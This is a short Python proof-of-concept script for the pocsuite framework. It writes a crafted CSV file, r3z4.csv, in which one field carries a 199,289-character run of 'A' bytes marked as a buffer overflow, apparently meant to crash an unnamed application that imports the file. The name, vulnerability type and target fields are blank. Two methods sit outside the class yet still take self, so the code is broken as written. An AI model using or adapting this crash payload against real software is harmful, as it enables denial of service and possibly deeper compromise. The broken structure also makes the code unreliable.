#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['抽烟的2b青年']
    vulDate = ''
    createDate = '2016-01-12'
    updateDate = '2016-01-12'
    references = ['http://www.sebug.net/vuldb/ssvid-']
    name = ''
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = ''
    desc = '''
    '''
    samples = ['']

    def _attack(self):
        result = {}
        #Write your code here
        hdr = '"' #start syntax
        hcr = "R3Z4" #user
        oth = ',"' #user
        oth2 = '","",""' #user
        val=','
        crash = "\x41"*199289 #B0F
        exp = hdr+hcr+hdr+val+hdr+hcr+hdr+oth+crash+oth2
        file = open("r3z4.csv", "w")
        file.write(exp)
        file.close()
        return self.parse_output(result)

def _verify(self):
        result = {}
        #Write your code here

        return self.parse_output(result)

def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)